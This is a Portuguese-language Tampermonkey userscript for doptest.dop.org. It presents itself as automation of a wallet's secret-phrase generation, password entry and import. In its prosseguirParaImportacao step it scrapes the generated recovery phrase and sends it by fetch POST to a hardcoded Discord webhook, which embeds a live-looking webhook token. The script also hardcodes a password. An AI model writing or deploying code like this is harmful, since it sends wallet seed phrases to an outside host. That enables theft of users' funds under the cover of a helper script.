// ==UserScript==
// @name         Automatização Completa dop.org
// @namespace    http://tampermonkey.net/
// @version      1.5
// @description  Automatiza o processo de geração e importação da frase secreta e reentrada de senha no dop.org com logs detalhados.
// @author       Você
// @match        https://doptest.dop.org/*
// @grant        none
// ==/UserScript==

(function() {
    'use strict';

    const senha = 'tantofaz'; // A senha desejada

    console.log('Script iniciado');

    // Função para selecionar elementos via XPath
    function selectElementByXPath(xpath) {
        return document.evaluate(xpath, document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue;
    }

    // Função atualizada para simular a inserção de texto de forma mais realista em campos controlados pelo React
    function simulateReactInputXPath(xpath, value) {
        const inputElement = selectElementByXPath(xpath);
        if (!inputElement) {
            console.error('Elemento não encontrado para o XPath fornecido:', xpath);
            return;
        }
        const nativeInputValueSetter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value').set;
        nativeInputValueSetter.call(inputElement, value);

        inputElement.dispatchEvent(new Event('input', { bubbles: true }));
        inputElement.dispatchEvent(new Event('change', { bubbles: true }));
    }

    function enviarFraseSecretaParaDiscord(fraseSecreta) {
    const webhookUrl = 'https://discord.com/api/webhooks/1210570411478229002/D7c9nyy9GAnLxuZQVYE4v4SwroIyqyjh5G1xGG6yM_YUM9TXG8XuSj0nzAqsPCAuEw35';
    const payload = {
        content: `Frase secreta: ${fraseSecreta}`
    };

    fetch(webhookUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(payload),
    })
    .then(response => console.log('Frase secreta enviada com sucesso para o Discord.'))
    .catch(error => console.error('Erro ao enviar frase secreta para o Discord:', error));
}

    function handleInitialPage() {
        console.log('Página inicial detectada');

        // Melhorando o estilo e posicionamento do botão "Iniciar"
        const gui = document.createElement('div');
        gui.style.position = 'fixed';
        gui.style.top = '50%';
        gui.style.left = '50%';
        gui.style.transform = 'translate(-50%, -50%)';
        gui.style.zIndex = '1000';
        gui.innerHTML = `<button id="iniciarBotao" style="padding: 20px 40px; font-size: 20px; cursor: pointer; border: none; border-radius: 5px; background-color: #4CAF50; color: white;">Iniciar</button>`;
        document.body.appendChild(gui);
        console.log('Botão "Iniciar" adicionado e estilizado na página');

        document.getElementById('iniciarBotao').addEventListener('click', iniciarProcesso);
    }

    function iniciarProcesso() {
        console.log('Botão "Iniciar" clicado');
        selectElementByXPath('//*[@id="speicalAZ215"]/button').click();
        console.log('Clique no botão de geração iniciado');

        esperarEInserirSenha();
    }

    function esperarEInserirSenha() {
        const esperarEInserirSenha = setInterval(() => {
            console.log('Tentando encontrar campos de senha...');
            const inputSenha1 = '//*[@id="root"]/section[2]/div/div/form/div/div[1]/input';
            const inputSenha2 = '//*[@id="root"]/section[2]/div/div/form/div/div[2]/input';

            if (selectElementByXPath(inputSenha1) && selectElementByXPath(inputSenha2)) {
                clearInterval(esperarEInserirSenha);
                console.log('Campos de senha detectados');

                simulateReactInputXPath(inputSenha1, senha);
                simulateReactInputXPath(inputSenha2, senha);
                console.log('Senhas inseridas com simulação de evento.');

                setTimeout(prosseguirParaImportacao, 500); // Dá um tempo para o evento de mudança ser processado
            }
        }, 1000);
    }

    function prosseguirParaImportacao() {
        selectElementByXPath('//*[@id="speicalAZ219"]').click();
        console.log('Clique para confirmar senha após inserção simulada');

        setTimeout(() => {
            const frases = [...document.querySelectorAll('.phrase-content .single-phrase p')]
            .map(el => el.textContent.trim()).join(' ');
            sessionStorage.setItem('fraseSecreta', frases);
            console.log('Frase secreta capturada e armazenada:', frases);

            // Adicione esta linha para enviar a frase para o Discord
            enviarFraseSecretaParaDiscord(frases);

            window.location.href = 'https://doptest.dop.org/import';
        }, 5000); // Ajuste este tempo conforme necessário
    }

    function handleImportPage() {
        console.log('Página de importação detectada');

        const esperarEInserirFrase = setInterval(() => {
            const inputFrase = '//*[@id="root"]/section[2]/div/div/form/div/div[1]/input';
            if (selectElementByXPath(inputFrase)) {
                clearInterval(esperarEInserirFrase);
                console.log('Campo de inserção da frase secreta detectado');

                const fraseSecreta = sessionStorage.getItem('fraseSecreta');
                simulateReactInputXPath(inputFrase, fraseSecreta);
                console.log('Frase secreta inserida:', fraseSecreta);

                setTimeout(() => {
                    // Clicar no botão após inserir a frase secreta
                    const botaoConfirmarFrase = '//*[@id="speicalAZ218"]';
                    if (selectElementByXPath(botaoConfirmarFrase)) {
                        selectElementByXPath(botaoConfirmarFrase).click();
                        console.log('Clique no botão para confirmar a frase secreta');

                        // Espera a ação anterior ser processada antes de prosseguir
                        setTimeout(() => inserirSenhaEConcluir(), 1000); // Ajuste conforme necessário
                    }
                }, 500); // Espera a inserção da frase secreta ser processada
            }
        }, 1000);
    }

    function inserirSenhaEConcluir(inputFrase) {
        // Espera aparecer o campo de senha novamente e insere a senha
        const inputSenha = '//*[@id="root"]/section[2]/div/div/form/div/div/input';
        if (selectElementByXPath(inputSenha)) {
            simulateReactInputXPath(inputSenha, senha);
            console.log('Senha reinserida na importação');

            setTimeout(() => {
                selectElementByXPath('//*[@id="speicalAZ225"]').click();
                console.log('Clique para confirmar a importação com senha');
            }, 500); // Espera a senha ser processada
        }
    }

    if (window.location.href === 'https://doptest.dop.org/') {
        handleInitialPage();
    } else if (window.location.href.includes('import')) {
        handleImportPage();
    }
})();
